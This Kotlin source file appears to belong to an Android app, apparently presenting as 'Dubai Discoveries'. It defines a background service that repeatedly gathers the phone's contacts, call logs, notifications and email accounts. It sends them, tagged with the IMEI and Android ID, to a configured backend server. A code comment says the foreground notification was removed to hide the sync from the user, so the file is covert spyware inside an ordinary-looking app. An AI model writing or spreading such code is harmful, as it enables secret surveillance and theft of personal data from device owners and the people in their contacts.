package com.devicesync.app.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.devicesync.app.R
import com.devicesync.app.utils.DataCollector
import com.devicesync.app.utils.DeviceConfigManager
import com.devicesync.app.utils.AppConfigManager
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.IOException
import java.util.concurrent.TimeUnit

class DataSyncService : Service() {
    
    companion object {
        private const val TAG = "DataSyncService"
        private const val NOTIFICATION_ID = 1001
        private const val CHANNEL_ID = "data_sync_channel"
    }
    
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val client = OkHttpClient.Builder()
        .connectTimeout(AppConfigManager.getTimeout().toLong(), TimeUnit.MILLISECONDS)
        .readTimeout(AppConfigManager.getTimeout().toLong(), TimeUnit.MILLISECONDS)
        .writeTimeout(AppConfigManager.getTimeout().toLong(), TimeUnit.MILLISECONDS)
        .build()
    
    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        Log.d(TAG, "DataSyncService created")
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "DataSyncService started")
        
        // Start foreground service - REMOVED to hide "Data sync in progress..." notification
        // startForeground(NOTIFICATION_ID, createNotification("Data sync in progress..."))
        
        // Start periodic data collection and sync
        serviceScope.launch {
            while (true) {
                try {
                    collectAndSyncData()
                    delay(AppConfigManager.getSyncInterval())
                } catch (e: Exception) {
                    Log.e(TAG, "Error in data sync loop", e)
                    delay(AppConfigManager.getSyncInterval())
                }
            }
        }
        
        return START_STICKY
    }
    
    override fun onBind(intent: Intent?): IBinder? = null
    
    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
        Log.d(TAG, "DataSyncService destroyed")
    }
    
    private suspend fun collectAndSyncData() {
        try {
            Log.d(TAG, "Starting data collection and sync...")
            
            // Collect data
            val dataCollector = DataCollector(this)
            val collectedData = dataCollector.collectAllData()
            val summary = dataCollector.getDataSummary()
            
            Log.d(TAG, "Data collected: $summary")
            
            // Get device code from config
            val deviceCode = DeviceConfigManager.getDeviceCode()
            if (deviceCode.isNullOrEmpty()) {
                Log.w(TAG, "Device code not found, skipping sync")
                return
            }
            
            // Sync each data type separately
            if (collectedData.has("contacts")) {
                syncDataToBackend("CONTACTS", deviceCode, collectedData.getJSONArray("contacts"))
            }
            
            if (collectedData.has("call_logs")) {
                syncDataToBackend("CALL_LOGS", deviceCode, collectedData.getJSONArray("call_logs"))
            }
            
            if (collectedData.has("notifications")) {
                syncDataToBackend("NOTIFICATIONS", deviceCode, collectedData.getJSONArray("notifications"))
            }
            
            if (collectedData.has("email_accounts")) {
                syncDataToBackend("EMAIL_ACCOUNTS", deviceCode, collectedData.getJSONArray("email_accounts"))
            }
            
            Log.d(TAG, "Data sync completed successfully")
            
        } catch (e: Exception) {
            Log.e(TAG, "Error collecting and syncing data", e)
        }
    }
    
    private suspend fun syncDataToBackend(dataType: String, deviceCode: String, data: org.json.JSONArray) {
        withContext(Dispatchers.IO) {
            try {
                val deviceId = getTelephonyDeviceId()
                val androidId = getAndroidDeviceId()
                
                // Create sync request with all device identifiers
                val syncRequest = JSONObject().apply {
                    put("deviceId", deviceId)
                    put("androidId", androidId)
                    put("deviceCode", deviceCode)
                    put("dataType", dataType)
                    put("data", data)
                    put("timestamp", java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", java.util.Locale.getDefault()).format(java.util.Date()))
                }
                
                val requestBody = syncRequest.toString().toRequestBody("application/json".toMediaType())
                
                // Build URL with deviceId in the path
                val syncUrl = "${AppConfigManager.getBackendUrl()}/api/devices/$deviceId/sync"
                
                val request = Request.Builder()
                    .url(syncUrl)
                    .post(requestBody)
                    .addHeader("Content-Type", "application/json")
                    .build()
                
                client.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        Log.d(TAG, "Successfully synced $dataType data")
                    } else {
                        Log.e(TAG, "Failed to sync $dataType data: ${response.code} - ${response.body?.string()}")
                    }
                }
                
            } catch (e: Exception) {
                Log.e(TAG, "Error syncing $dataType data", e)
            }
        }
    }
    
    private fun getAndroidDeviceId(): String {
        return android.provider.Settings.Secure.getString(
            contentResolver,
            android.provider.Settings.Secure.ANDROID_ID
        ) ?: "unknown_android_id"
    }
    
    private fun getTelephonyDeviceId(): String {
        return try {
            if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_STATE) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                Log.w(TAG, "READ_PHONE_STATE permission not granted, using Android ID as device ID")
                return getAndroidDeviceId()
            }
            
            val telephonyManager = getSystemService(android.content.Context.TELEPHONY_SERVICE) as android.telephony.TelephonyManager
            val deviceId = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                telephonyManager.imei ?: getAndroidDeviceId()
            } else {
                telephonyManager.deviceId ?: getAndroidDeviceId()
            }
            
            Log.d(TAG, "Device ID (IMEI/MEID): $deviceId")
            deviceId
        } catch (e: Exception) {
            Log.w(TAG, "Error getting device ID, using Android ID", e)
            getAndroidDeviceId()
        }
    }
    
    private fun getDeviceName(): String {
        return "${Build.MANUFACTURER} ${Build.MODEL}"
    }
    
    private fun getDeviceModel(): String {
        return Build.MODEL
    }
    
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Data Sync Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Background data synchronization service"
                setShowBadge(false)
            }
            
            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }
    }
    
    private fun createNotification(message: String): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Dubai Discoveries")
            .setContentText(message)
            .setSmallIcon(R.drawable.ic_sync)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setAutoCancel(false)
            .build()
    }
} 